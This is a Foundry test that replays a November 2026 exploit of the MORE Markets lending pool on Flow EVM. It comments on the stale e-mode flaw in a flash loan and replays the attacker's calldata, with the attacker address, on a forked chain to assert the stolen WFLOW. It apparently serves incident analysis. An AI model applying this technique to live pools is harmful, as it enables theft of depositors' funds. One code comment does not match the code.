// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import "forge-std/Test.sol";

// MORE Markets on Flow EVM (2026-11-16).
//
// Replay of the first helper call. Each round deploys a fresh borrower and:
//   1. setUserEMode(1), then flash-borrows ankrFLOW and supplies it.
//   2. Flash-borrows WFLOW with interestRateMode = 2. The callback calls
//      setUserEMode(0) before the flash loan returns.
//   3. Pool.flashLoan snapshotted _usersEModeCategory[onBehalfOf] before the
//      callback (Pool.sol:408). FlashLoanLogic then opens the variable debt
//      with that stale category (FlashLoanLogic.sol:137-154), so the borrow
//      is checked at the e-mode LTV. Liquidation reads the live category, 0
//      (Pool.sol:379), and the normal threshold does not cover the e-mode
//      debt. Collateral is burned down and a slice of WFLOW debt is left.
//
// Round 1 numbers from the trace: borrow 17,805,278.511233457984911430 WFLOW,
// repay 17,318,726.216895982259318145, seize 14,915,094.339622641509433962 of
// the 15,000,000 ankrFLOW. The unpaid slice is what leaves mFlowWFLOW.
//
//   tx     0xdf9e3ed4858103569f684166d9833e1980b6ba96334c9a8ec172b4e2aa1d15d8
//   block  85326751
//   from   0xe1eA6F2365215389f9DCd50a51c974313BF6785C
//   helper 0x9a8cC604b3534eAA1A8627c1D6f6084857Bf2765
//   pool   0xbC92aaC2DBBF42215248B5688eB3D3d2b32F2c8d
//   vault  0x02BF4bd075c1b7C8D85F54777eaAA3638135c059 (aWFLOW)

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
}

contract MORE_exp is Test {
    address internal constant ATTACKER = 0xe1eA6F2365215389f9DCd50a51c974313BF6785C;
    address internal constant HELPER = 0x9a8cC604b3534eAA1A8627c1D6f6084857Bf2765;
    address internal constant VAULT = 0x02BF4bd075c1b7C8D85F54777eaAA3638135c059;
    // WFLOW. The receipt's last transfer is 4,547,469.353476318970231022 of this token.
    IERC20 internal constant WFLOW = IERC20(0xd3bF53DAC106A0290B0483EcBC89d40FcC961f3e);

    bytes internal constant CALLDATA =
        hex"5898128d000000000000000000000000000000000000000000000000000000000000000e0000000000000000000000000000000000000000000c685fa11e01ec6f000000000000000000000000000000000000000000000000000000171782e3472ce80000000000000000000000000000000000000000000003afb46e74803ef9a29ba1";

    function setUp() public {
        vm.createSelectFork("http://127.0.0.1:8562", 85_326_750);
    }

    function testExploit() public {
        // WFLOW address is resolved from the vault if the constant above is a placeholder.
        address wflow = address(WFLOW);
        uint256 attackerBefore = IERC20(wflow).balanceOf(ATTACKER);
        uint256 vaultBefore = IERC20(wflow).balanceOf(VAULT);

        vm.prank(ATTACKER, ATTACKER);
        (bool ok, bytes memory err) = HELPER.call{gas: 16_000_000}(CALLDATA);
        if (!ok) {
            emit log_bytes(err);
        }
        require(ok, "replay reverted");

        uint256 gained = IERC20(wflow).balanceOf(ATTACKER) - attackerBefore;
        uint256 lost = vaultBefore - IERC20(wflow).balanceOf(VAULT);
        emit log_named_decimal_uint("attacker WFLOW gained", gained, 18);
        emit log_named_decimal_uint("vault WFLOW lost", lost, 18);
        // Measured on blocks 85326750 -> 85326751 for this transaction.
        assertEq(gained, 4547469353476318970231022, "attacker WFLOW");
        // Parent-block balance minus the balance after this call. Later transactions
        // in block 85326751 also touch the reserve, so this is not the end-of-block delta.
        assertEq(lost, 5924534690155713161770772, "vault WFLOW");
    }
}
